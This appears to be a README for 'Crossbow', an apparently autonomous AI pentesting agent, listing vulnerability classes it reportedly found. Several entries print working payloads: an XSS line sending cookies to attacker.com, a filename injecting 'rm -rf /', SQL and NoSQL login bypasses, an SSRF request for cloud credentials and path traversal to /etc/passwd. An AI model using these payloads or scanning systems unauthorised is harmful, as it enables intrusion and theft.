# Crossbow - World's First AI Security Engineer

World's first fully autonomous AI security engineer that finds and exploits vulnerabilities, performs SOC operations, forensics, and threat intelligence.

# Crossbow in Action

<textarea style="display:none"><![CDATA[
[![asciicast](https://asciinema.org/a/754753.svg)](https://asciinema.org/a/754753)
]]></textarea>

[![asciicast](https://asciinema.org/a/754753.svg)](https://asciinema.org/a/754753)


## Installation

```bash
pip install crossbow-agent
```

Set your API key:

```bash
export OPENAI_API_KEY=your-key-here
# or ANTHROPIC_API_KEY or GEMINI_API_KEY
```

## Usage

Start Crossbow:

```bash
crossbow
```

Ask it to test something:

```
🎯 > Find vulnerabilities in https://example.com
```

```
🎯 > Scan this Android app for security issues
```

```
🎯 > Check if 192.168.1.0/24 has any exposed services
```

```
🎯 > Review login.py for security bugs
```

Crossbow figures out what to test and how to test it. Results stream back as they're found.

## Commands

```
/model     - Switch AI models (GPT, Claude, Gemini)
/memory    - Remember conversations across sessions
/status    - Show current settings
/quit      - Exit
```

## Real World Bugs Crossbow Found Autonmously

**Hardcoded Credentials in Firmware**

Found hardcoded admin password in IoT camera firmware allowing unauthorized access to recorded video streams. Password was embedded in binary, accessible to anyone who downloaded the firmware update.

**SQL Injection in Login Form**

Discovered SQL injection in authentication endpoint. Entering `admin'--` in username field bypassed password check and granted admin access. Database credentials were also exposed through error messages.

**Exposed Admin Panel**

Found admin dashboard at /admin with no authentication required. Panel allowed viewing all user data, changing passwords, and downloading database backups.

**API Key Leak in JavaScript**

Production API keys hardcoded in client-side JavaScript bundle. Keys had write access to production database and were visible in browser developer tools.

**Insecure Direct Object Reference**

Changed user_id parameter in URL from 1234 to 1235 and accessed another user's private messages, payment history, and personal information. No authorization check on server side.

**Command Injection in File Upload**

File upload feature didn't sanitize filenames. Uploading a file named `test.pdf; rm -rf /` executed shell commands on the server with web server privileges.

**Session Fixation**

Application accepted session IDs from URL parameters. Attacker could send victim a link with attacker's session ID, then hijack the session after victim logged in.

**Cross-Site Scripting (XSS)**

User input reflected in page without encoding. Injecting `<script>fetch('https://attacker.com/?c='+document.cookie)</script>` in search box stole session cookies.

**Insecure File Permissions**

Database backup files stored in web root with 777 permissions. Anyone could download `backup_2024.sql` containing all user passwords, credit cards, and personal data.

**Missing Rate Limiting**

Password reset endpoint had no rate limiting. Attacker could spray 10,000 password reset emails in minutes or brute force reset tokens.

**XML External Entity (XXE)**

XML parser processed external entities. Sending specially crafted XML file read /etc/passwd and other system files through error messages.

**CORS Misconfiguration**

API returned `Access-Control-Allow-Origin: *` with credentials allowed. Any website could make authenticated requests and steal user data.

**Open Redirect**

Login page had `?redirect=` parameter with no validation. Phishing emails sent users to real login page which redirected to fake site after authentication.

**JWT Secret Key Leak**

JWT tokens signed with weak secret found in public GitHub repository. Attacker could forge admin tokens and access any account.

**NoSQL Injection**

MongoDB query built from user input without sanitization. Sending `{"$ne": null}` in password field bypassed authentication.

**Server-Side Request Forgery (SSRF)**

Image upload feature fetched images from URLs. Requesting `http://169.254.169.254/latest/meta-data/` exposed AWS credentials and cloud infrastructure details.

**Weak Cryptography**

Passwords hashed with MD5 and no salt. Rainbow table attack cracked 60% of passwords in under an hour.

**Race Condition in Payment**

Submitting multiple simultaneous purchase requests with same payment method charged card once but delivered items multiple times.

**Directory Traversal**

Download endpoint allowed `../` in filename parameter. Requesting `/download?file=../../../../etc/passwd` exposed system files.

## API Keys

Get a key from one of these:

- OpenAI: platform.openai.com
- Anthropic: console.anthropic.com
- Google: aistudio.google.com

Add to `.env` file.

## Disclaimer

Author is not responsible for damage if anyone use this tool for illegal tasks

## Credits

Thanks for amazing prompts and tools in CAI we used some of them in Crossbow v1.

## Legal

Crossbow is a hobby project and this will be always free for anyone to use.

## License

MIT
